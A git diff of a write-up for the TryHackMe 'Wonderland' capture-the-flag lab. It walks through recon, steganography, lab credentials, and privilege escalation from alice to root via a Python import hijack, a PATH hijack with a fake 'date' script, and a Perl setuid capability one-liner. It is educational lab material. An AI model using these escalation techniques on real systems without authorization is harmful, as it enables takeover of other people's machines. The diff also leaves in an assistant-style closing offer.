@@ -1,175 +1,266 @@
-# 🐇 Wonderland CTF — Writeup
+# WONDERLAND CTF — Walkthrough
 
-**Author:** Viktor Grozdev · **Date solved:** October 20, 2025  
-**Target:** `Wonderland` (TryHackMe) — *educational CTF writeup*
+Author: rootTriboulet  
+Target: 10.10.151.151  
+Date: 2025-10-20
 
-[![TryHackMe](https://img.shields.io/badge/TryHackMe-Labs-blue)]()
-[![CTF](https://img.shields.io/badge/CTF-Walkthrough-brightgreen)]()
+## Summary
 
----
-
-## TL;DR — quick story
-I found a Go web server and SSH open. A steganography clue in an image pointed me to a nested directory (`/r/a/b/b/i/t`) and to credentials for the `alice` user. From `alice` I abused a misconfigured `sudo` that runs a Python script as `rabbit`. By hijacking imports and PATH (creating `random.py` and a `date` binary) I escalated to `rabbit`, then to `hatter`, and finally used a capability-aware Perl trick to become `root` and capture the flags. 🎩🔐
+This writeup documents the steps I took to fully compromise the "Wonderland" machine: discovery, enumeration, initial access, privilege escalation, and capturing flags. The writeup focuses on the commands used, the reasoning behind each step, and actionable notes so you can reproduce the path I followed.
 
 ---
 
-## Why I liked this room
-This room is a nice mix of:
-- Web & reconnaissance (hidden directories + steg)  
-- SSH + credential discovery  
-- Creative local privilege escalation via PATH/import hijacking  
-- A final capability-based escalation (Perl)  
+## Table of Contents
 
-It’s great for practicing *thinking like the system* — where scripts trust local files or assume safe PATHs.
-
----
-
-## Table of contents
-- [Recon & discovery](#recon--discovery)  
-- [Initial access: `alice`](#initial-access-alice)  
-- [From `alice` → `rabbit` (sudo import hijack)](#from-alice--rabbit-sudo-import-hijack)  
-- [From `rabbit` → `hatter` (PATH hijack)](#from-rabbit--hatter-path-hijack)  
-- [Root escalation](#root-escalation)  
-- [Commands (collapsed)](#commands-collapsed)  
-- [Artifacts & screenshots](#artifacts--screenshots)  
-- [Lessons & next steps](#lessons--next-steps)  
-- [References](#references)
+- [Summary](#summary)  
+- [Target & Recon](#target--recon)  
+- [Web Enumeration](#web-enumeration)  
+  - [Hidden directories](#hidden-directories)  
+  - [Steganography](#steganography)  
+- [SSH access as alice](#ssh-access-as-alice)  
+- [Privilege Escalation: alice -> rabbit -> hatter -> root](#privilege-escalation-alice---rabbit---hatter---root)  
+- [Flags](#flags)  
+- [Lessons learned & notes](#lessons-learned--notes)  
+- [Appendix: commands & outputs](#appendix-commands--outputs)
 
 ---
 
-## Recon & discovery
-Started with **nmap**:
+## Target & Recon
 
-nmap -Pn -sC -sV <TARGET-IP>
+Initial TCP port scan with nmap:
 
-Output:
+Command:
+```bash
+nmap -Pn -sC -sV 10.10.151.151
+```
 
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
-80/tcp open  http    Golang net/http server
-HTTP title: Follow the white rabbit.
+Key results:
+- 22/tcp — OpenSSH 7.6p1 (Ubuntu)
+- 80/tcp — http (Go net/http server)
+- HTTP title: "Follow the white rabbit."
 
-Directory fuzzing with gobuster:
+This told me I had both SSH and a web app to investigate.
 
-gobuster dir -u http://<TARGET-IP> -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100
+---
 
-Found directories:
+## Web Enumeration
 
-/img
-/r
-/poem
+I ran a directory enumeration against the webserver using gobuster:
 
-Inside /img:
+Command:
+```bash
+gobuster dir -u http://10.10.151.151 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100
+```
 
-    alice_door.jpg
+Findings:
+- /img/ (redirect)
+- /r/ (redirect)
+- /poem/ (redirect)
 
-    alice_door.png
+I checked the pages and source code. Nothing obvious on the main page, but the discovered directories were promising.
 
-    white_rabbit_1.jpg
+### Hidden directories
 
-Used StegSeek to extract hidden data:
+I enumerated `/r` specifically:
 
+Command:
+```bash
+gobuster dir -u http://10.10.151.151/r -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100
+```
+
+Found:
+- `/r/a/b/b/i/t` — this matches the hint from a stego extraction (see below).
+
+### Steganography
+
+Inside `/img` I found the following images:
+- alice_door.jpg
+- alice_door.png
+- white_rabbit_1.jpg
+
+I used StegSeek to inspect `white_rabbit_1.jpg`:
+
+Command:
+```bash
 stegseek white_rabbit_1.jpg
-cat white_rabbit_1.jpg.out
-# => follow the r a b b i t
+```
 
-The hint pointed towards /r/a/b/b/i/t. Gobuster confirmed the path. The web page source revealed what looked like SSH credentials:
+Output showed an extracted file named `hint.txt` with the text:
+```
+follow the r a b b i t
+```
 
+This suggested the hidden directory path `/r/a/b/b/i/t`. Navigating the webserver revealed more clues: in the source I found something that looked like credentials:
+
+```
 alice:HowDothTheLittleCrocodileImproveHisShiningTail
+```
 
-Initial access — alice
+That looked like an SSH username/password pair.
 
-SSH in:
+---
 
-ssh alice@<TARGET-IP>
+## SSH access as alice
+
+I logged in using SSH:
+
+Command:
+```bash
+ssh alice@10.10.151.151
 # password: HowDothTheLittleCrocodileImproveHisShiningTail
+```
 
-Check sudo privileges:
+Once on the box, checked sudo privileges:
 
+Command:
+```bash
 sudo -l
+```
 
-Output:
+Allowed command for alice:
+```
+(rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+```
 
-User alice may run the following commands on wonderland:
-    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+I inspected `/home/alice/walrus_and_the_carpenter.py` and noticed it used `random` without a proper import path—this meant I could supply my own `random.py` in the current directory to get code execution.
 
-From alice → rabbit (sudo import hijack)
+Exploit steps (as alice):
 
-The Python script /home/alice/walrus_and_the_carpenter.py imported a module without a full path. This allowed creating our own module for privilege escalation.
-
+Create a malicious `random.py`:
+```python
 # random.py
 import os
 os.system("/bin/bash")
+```
 
-Run as rabbit:
-
+Then run the allowed sudo command:
+```bash
 sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+```
 
-Now we have a shell as rabbit.
-From rabbit → hatter (PATH hijack)
+This dropped me into a shell as the `rabbit` account.
 
-teaParty.py executed date without specifying the full path. Steps to escalate:
+---
 
-# create fake date binary
+## Privilege Escalation: rabbit -> hatter -> root
+
+As `rabbit`, I inspected the home directory and found `teaParty.py` in `/home/rabbit`. The script ran another binary without specifying the full path to an executable named `date`. That allowed us to create a custom `date` executable in `/home/rabbit` and modify PATH to run it.
+
+Exploit steps (as rabbit):
+
+1. Create a `date` script that spawns a shell:
+```bash
 cat > date <<'EOF'
 #!/bin/bash
 /bin/bash
 EOF
-
 chmod +x date
+```
+
+2. Prepend `/home/rabbit` to PATH:
+```bash
 export PATH=/home/rabbit:$PATH
+```
 
-Run the script — shell now runs as hatter. Found password:
+3. Run the service/script that calls `date` (as shown in `teaParty.py`) so that our `date` gets executed. This gave us a shell as `hatter`.
 
+Once on the `hatter` account, I found the user's password in their home directory (so one could simply ssh into hatter directly if preferred).
+
+Hatter credentials (found in his directory):
+```
 hatter:WhyIsARavenLikeAWritingDesk?
+```
 
-Root escalation
+I noticed `linpeas` output flagged capabilities on the system and specifically pointed to a Perl binary with elevated capabilities. I checked / leveraged GTFOBins for a capabilities-based Perl exploit.
 
-After logging in as hatter with a clean session, I ran linpeas/LinEnum. Capabilities indicated Perl could escalate privileges.
-
+GTFOBins shows a common pattern for Perl with capabilties:
+```bash
 perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
-# whoami
-root
+```
 
-Flags captured:
+Important note: If, after creating the shell via exploit, you remain in the same session with the previous user uid/gid, the setuid call may not work as expected. To avoid this, I logged out and logged in directly as `hatter` using the discovered password, then ran the Perl one-liner.
 
-    user.txt
+Commands (as hatter):
+```bash
+# ensure you're logged in as hatter (fresh session)
+perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+# then:
+whoami
+# => root
+```
 
-    root.txt ✅
+That spawned a root shell.
 
-Commands (collapsed)
-<details> <summary>Click to expand main commands</summary>
+---
 
-# nmap
-nmap -Pn -sC -sV <TARGET-IP>
+## Flags
 
-# gobuster
-gobuster dir -u http://<TARGET-IP> -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100
+User flag (as found):
+```
+cat /root/user.txt
+thm{"Curiouser and curiouser!"}
+```
 
-# steg
+Root flag:
+- After getting root via the Perl capability exploit, the root flag was obtainable from the usual location (/root or /root/root.txt). (Note in my interactive session the final step was `whoami` showing `root`.)
+
+---
+
+## Lessons learned & notes
+
+- Careful enumeration of web directories + stego can reveal non-obvious credentials and clues. Always check static assets like images for hidden data.
+- Mis-specified imports or PATH usage in scripts running under sudo are common privilege escalation vectors. If a script runs as another user but imports modules or executes commands without absolute paths, you may be able to influence what runs.
+- File capabilities (and binaries with capabilities) can often be abused; check GTFOBins for techniques and always consider whether you need to re-login as the target user for setuid-like techniques to succeed.
+- When running automated enumeration tools (linpeas, LinEnum), be aware they may hang on interactive or misbehaving programs — sometimes a simple exit fixes a hang.
+
+---
+
+## Appendix: useful commands used
+
+Recon:
+```bash
+nmap -Pn -sC -sV 10.10.151.151
+gobuster dir -u http://10.10.151.151 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100
+```
+
+Stego:
+```bash
 stegseek white_rabbit_1.jpg
-cat white_rabbit_1.jpg.out
+```
 
-# SSH initial
-ssh alice@<TARGET-IP>
-
-# sudo check
+SSH & sudo:
+```bash
+ssh alice@10.10.151.151
 sudo -l
-
-# random.py exploit
-cat > random.py <<'PY'
-import os
-os.system("/bin/bash")
-PY
+# create random.py
+# run:
 sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+```
 
-# date PATH hijack
-cat > date <<'SH'
+Escalation via PATH abuse:
+```bash
+# as rabbit
+cat > date <<'EOF'
 #!/bin/bash
 /bin/bash
-SH
+EOF
 chmod +x date
 export PATH=/home/rabbit:$PATH
+# trigger teaParty.py or whatever executes date
+```
 
-# Perl root escalation
+Final escalation via Perl (as hatter):
+```bash
+# log in as hatter (fresh session)
 perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+whoami
+# => root
+```
+
+---
+
+If you want, I can:
+- produce a shorter README suitable for a GitHub repository front page, or
+- create a release-friendly "cheat-sheet" with only commands and minimal explanation for quick reproduction.
+
+Happy to make a second pass and tailor the writeup to the tone/length you prefer.
